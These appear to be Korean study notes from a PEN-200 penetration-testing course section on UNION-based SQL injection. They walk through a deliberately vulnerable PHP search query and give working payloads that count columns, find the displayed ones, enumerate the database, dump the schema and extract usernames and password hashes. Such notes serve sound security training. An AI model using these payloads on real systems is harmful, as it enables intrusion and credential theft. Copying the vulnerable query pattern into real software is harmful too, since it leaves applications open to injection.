# 10.2.2 UNION 기반 페이로드 활용

> **UNION-based Payloads** · PEN-200 §10.2.2

질의 결과가 화면에 함께 표시되는 in-band 상황이면 UNION 기반도 같이 시험함. `UNION` 은 **추가 `SELECT` 문을 원 질의에 이어 붙여 한 번에 결과를 받는** 키워드라, 원래 볼 수 없던 테이블의 데이터를 정상 출력 자리에 실어 나를 수 있음.

성립 조건 둘 — ① 주입한 `UNION` 질의의 **컬럼 개수가 원 질의와 같을 것** ② 컬럼별 **자료형이 호환될 것**. 이 둘이 이후 절차 전부를 규정함.

예제 대상은 검색 기능의 이 질의임:

```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

*취약한 검색 질의 — 입력이 `LIKE` 절에 그대로 연결됨*

`LIKE` 와 `%` 로 부분 일치 검색을 하는 구조라, 입력 뒤에 `%` 가 붙는다는 점이 페이로드 설계에 영향을 줌.

1단계는 **컬럼 개수 확정**. ⚠️ 화면에 보이는 컬럼 수로 짐작하면 안 됨 — 출력되지 않는 컬럼이 있을 수 있음.

```
' ORDER BY 1-- //
```

*정확한 컬럼 개수 확인*

`ORDER BY N` 은 N 번째 컬럼이 없으면 오류를 냄 → 숫자를 1씩 올리다 오류가 나는 직전 값이 실제 컬럼 수임(예제에서는 6에서 오류 → 5개).

2단계는 **어느 컬럼이 화면에 출력되는가** 확인. 개수만큼 식별 가능한 문자열을 채워 넣어 자리 대응을 눈으로 확인함.

```
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```

*주입한 표식이 어느 컬럼 위치에 뜨는지 확인 — 이후 페이로드의 배치 근거*

3단계는 실제 열거. 앞의 `%'` 는 `LIKE` 조건을 「전부 일치」로 만들면서 검색 파라미터의 따옴표를 닫는 역할임 — 원 `customers` 결과까지 같이 끌고 오게 됨. 그 뒤로 `UNION SELECT` 를 이어 DB 명·사용자·버전을 1·2·3번 컬럼에, 나머지 둘은 `null` 로 채움.

```
%' UNION SELECT database(), user(), @@version, null, null -- //
```

결과에는 사용자와 버전은 나오는데 **DB 명만 빠짐.** 원인 — 1번 컬럼은 대개 정수형 ID 자리라 문자열을 못 받고, 애플리케이션도 ID 컬럼은 사용자에게 쓸모없다고 보아 출력에서 뺌. **자료형 불일치를 피하려면 열거 함수를 오른쪽 컬럼으로 밀 것.**

```
' UNION SELECT null, null, database(), user(), @@version  -- //
```

*컬럼 배치를 고쳐 세 값이 모두 반환되게 함 — 현재 DB 명은 `offsec`*

이때 앞의 `%` 는 생략 가능함 — 출력 형태를 이미 확인했으므로 원 검색 결과를 함께 끌고 올 필요가 없음.

4단계는 **스키마 열거**. `information_schema.columns` 를 현재 DB 로 한정해 뽑으면 테이블명·컬럼명이 한 번에 나옴.

```
' union select null, table_name, column_name, table_schema, null from
information_schema.columns where table_schema=database() -- //
```

*현재 DB 의 테이블·컬럼 구조 덤프*

여기서 `users` 테이블과 `password` 컬럼의 존재를 확인한 뒤, 앞서 파악한 컬럼 배치에 맞춰 자격 증명을 뽑음.

```
' UNION SELECT null, username, password, description, null FROM users -- //
```

*users 테이블의 사용자명·해시 덤프*

결과는 관리자 계정을 포함한 전체 사용자명과 MD5 해시 — 별도 크래킹 도구로 평문 복원 대상이 됨.
